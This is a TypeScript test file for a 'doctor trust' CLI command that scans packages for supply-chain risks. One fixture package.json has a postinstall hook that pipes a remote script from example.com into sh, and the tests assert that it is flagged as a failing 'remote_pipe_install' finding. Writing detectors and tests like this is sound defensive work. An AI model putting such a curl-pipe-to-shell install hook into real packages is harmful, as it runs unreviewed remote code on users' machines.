import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";

import { runCli } from "../src/run-cli.js";

function createIo() {
  const stdout: string[] = [];
  const stderr: string[] = [];

  return {
    stdout,
    stderr,
    io: {
      writeStdout(message: string) {
        stdout.push(message);
      },
      writeStderr(message: string) {
        stderr.push(message);
      }
    }
  };
}

async function createRiskyPackage(): Promise<string> {
  const targetPath = await mkdtemp(path.join(os.tmpdir(), "codex-plugin-doctor-trust-"));

  await mkdir(targetPath, { recursive: true });
  await writeFile(
    path.join(targetPath, "package.json"),
    JSON.stringify(
      {
        name: "risky-package",
        version: "1.0.0",
        scripts: {
          postinstall: "curl https://example.com/install.sh | sh"
        },
        dependencies: {
          "left-pad": "*"
        }
      },
      null,
      2
    ),
    "utf8"
  );

  return targetPath;
}

describe("doctor trust command", () => {
  it("renders finding fingerprints in text output", async () => {
    const targetPath = await createRiskyPackage();
    const { io, stdout, stderr } = createIo();

    const exitCode = await runCli(["doctor", "trust", targetPath], io);

    expect(exitCode).toBe(1);
    expect(stderr).toEqual([]);
    expect(stdout.join("")).toMatch(/Fingerprint: [a-f0-9]{64}/);
  });

  it("fails packages with remote pipe install scripts", async () => {
    const targetPath = await createRiskyPackage();
    const { io, stdout, stderr } = createIo();

    const exitCode = await runCli(["doctor", "trust", targetPath, "--json"], io);
    const output = JSON.parse(stdout.join(""));

    expect(exitCode).toBe(1);
    expect(stderr).toEqual([]);
    expect(output.schemaVersion).toBe("1.0.0");
    expect(output.status).toBe("fail");
    expect(output.score).toBeLessThan(80);
    expect(output.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "trust.package.remote_pipe_install",
          severity: "fail",
          fingerprint: expect.stringMatching(/^[a-f0-9]{64}$/)
        }),
        expect.objectContaining({ id: "trust.package.unpinned_dependency", severity: "warn" })
      ])
    );
  });

  it("includes existing MCP security findings in the trust score", async () => {
    const { io, stdout, stderr } = createIo();

    const exitCode = await runCli(["doctor", "trust", "tests/fixtures/security-hardcoded-secret", "--json"], io);
    const output = JSON.parse(stdout.join(""));

    expect(exitCode).toBe(1);
    expect(stderr).toEqual([]);
    expect(output.status).toBe("fail");
    expect(output.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "plugin.security.hard_coded_secret", severity: "fail" })
      ])
    );
  });

  it("writes trust JSON to an output path", async () => {
    const targetPath = await createRiskyPackage();
    const outputPath = path.join(
      await mkdtemp(path.join(os.tmpdir(), "codex-plugin-doctor-trust-output-")),
      "trust.json"
    );
    const { io, stdout, stderr } = createIo();

    const exitCode = await runCli(["doctor", "trust", targetPath, "--json", "--output", outputPath], io);
    const writtenReport = JSON.parse(await readFile(outputPath, "utf8"));

    expect(exitCode).toBe(1);
    expect(stderr).toEqual([]);
    expect(JSON.parse(stdout.join(""))).toEqual(writtenReport);
    expect(writtenReport.findings[0].id).toBe("trust.package.remote_pipe_install");
  });
});
